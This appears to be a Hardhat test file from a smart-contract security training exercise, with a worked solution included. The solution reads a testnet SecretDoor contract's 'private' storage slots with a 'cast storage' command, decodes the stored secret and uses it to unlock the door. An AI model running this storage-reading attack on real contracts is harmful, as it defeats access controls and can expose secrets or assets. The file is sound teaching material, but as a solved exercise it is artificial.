const { expect } = require("chai");
const { ethers } = require("hardhat");
const fs = require('fs');

describe("Sensitive On-Chain Data Exercise 2", function () {
  
  let muggle;
  const SECRET_DOOR_ABI = fs.readFileSync("./test/sensitive-on-chain-data-2/SecretDoorABI.json").toString()
  const SECRET_DOOR_ADDRESS = "0x148f340701D3Ff95c7aA0491f5497709861Ca27D"

  before(async () => {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [muggle] = await ethers.getSigners();
    // Load SecretDoor Contract
    this.secretDoor = new ethers.Contract(
      SECRET_DOOR_ADDRESS, SECRET_DOOR_ABI, muggle
    )

    await this.secretDoor.unlockDoor(ethers.utils.formatBytes32String("EatSlugs"));
  })

  it("Exploit", async () => {    
    /** CODE YOUR SOLUTION HERE */
    
    /*

    CMD: cast storage [contract] [slot] --rpc-url https://ethereum-goerli-rpc.allthatnode.com

    Slot 0: 0x0000000000000000000000009cc6d4d0d1aac085ff54f254d206d9890f60338c (Owner)
    Slot 1: 0x0000000000000000000000000000000000000000000000000000000000000001 (Reentrnacy State Var)
    Slot 2: 0x0000000000000000000000000000000000000000000000000000000000000701 (Door Number + isLocked)
    Slot 3: 0x566f6c64656d6f72740000000000000000000000000000000000000000000000 (Door Owner)
    Slot 4: 0x416c3068306d3072610000000000000000000000000000000000000000000000 (Secret Spell)

    Door Number: 7
    Door Owner: Voldemort
    Secret Spell: Al0h0m0ra

    */

    await this.secretDoor.unlockDoor(ethers.utils.formatBytes32String("Al0h0m0ra"));
    
  })

  after(async () => {
    /** SUCCESS CONDITIONS */

    expect(await this.secretDoor.isLocked()).to.eq(false)
  })
});
